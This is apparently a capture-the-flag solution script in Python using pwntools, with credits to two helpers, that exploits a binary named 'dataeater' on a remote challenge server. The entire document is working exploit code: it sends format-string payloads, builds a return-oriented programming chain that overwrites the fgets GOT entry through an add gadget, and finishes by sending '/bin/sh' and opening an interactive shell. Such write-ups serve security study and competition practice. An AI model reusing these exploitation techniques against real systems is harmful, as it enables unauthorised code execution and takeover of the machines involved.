#!/usr/bin/env python3
# With help from khokho and nobodyisnobody

from pwn import *

exe = ELF("./dataeater_patched")

context.binary = exe


def conn():
    r = process([exe.path])
    return r


def main():
    
    #p = conn()
    p = remote("mc.ax", 31869)
    add_gadget = 0x0000000000400628 #: add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
    pop_rbp = 0x00000000004005c8
    pop_rbx = 0x000000000040078a # pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
    pop_rdi = 0x0000000000400793

    payload = b"%4$s"
    pause()
    p.sendline(payload)
    sleep(0.5)
    # format string here.
    payload = b"%1$p"*1 + b"%13$s"
    payload = payload.ljust(0x10, p8(0))
    payload += p64(0x400792)
    payload += p64(exe.got["memset"] - 0x8)
    

    address = exe.got["fgets"] + 0x3d
    add = 0x56d00

    rop = p64(pop_rbx)
    rop += p64(add)*6
    rop += p64(pop_rbp)
    rop += p64(address)
    rop += p64(add_gadget)
    rop += p64(pop_rbx)
    rop += p64(0)*2 + p64(exe.got["fgets"]) + p64(0x601018) + p64(0)*2
    rop += p64(0x0000000000400770)
    rop += b"M"*0x40

    payload += rop
    p.sendline(payload)

    sleep(0.5)
    p.sendline(b"/bin/sh\x00" + p32(0x0000000000400786))

    p.interactive()


if __name__ == "__main__":
    main()
